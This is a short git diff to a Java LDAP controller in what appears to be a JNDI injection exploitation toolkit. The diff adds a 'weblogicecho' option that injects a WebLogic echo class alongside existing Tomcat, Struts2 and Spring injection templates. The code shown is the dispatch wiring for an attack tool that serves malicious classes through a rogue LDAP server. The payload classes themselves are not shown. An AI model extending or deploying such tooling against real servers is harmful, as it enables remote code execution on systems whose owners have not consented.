@@ -22,6 +22,7 @@ import com.nu1r.jndi.template.struts2.Struts2ActionMS;
 import com.nu1r.jndi.template.tomcat.*;
 import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.utils.Util;
+import com.nu1r.jndi.template.weblogic.weblogicEcho;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -87,6 +88,9 @@ public class TomcatBypassController implements LdapController {
                     break;
                 case springecho:
                     code = helper.injectSpringEcho();
+                    break;
+                case weblogicecho:
+                    code = helper.injectWeblogicEcho();
                     break;
                 case issuccess:
                     code = helper.injectSuccess();
@@ -331,6 +335,10 @@ public class TomcatBypassController implements LdapController {
 
         public String injectSpringEcho() {
             return injectClass(SpringEchoTemplate.class);
+        }
+
+        public String injectWeblogicEcho() {
+            return injectClass(weblogicEcho.class);
         }
 
         public String injectAllEcho() {
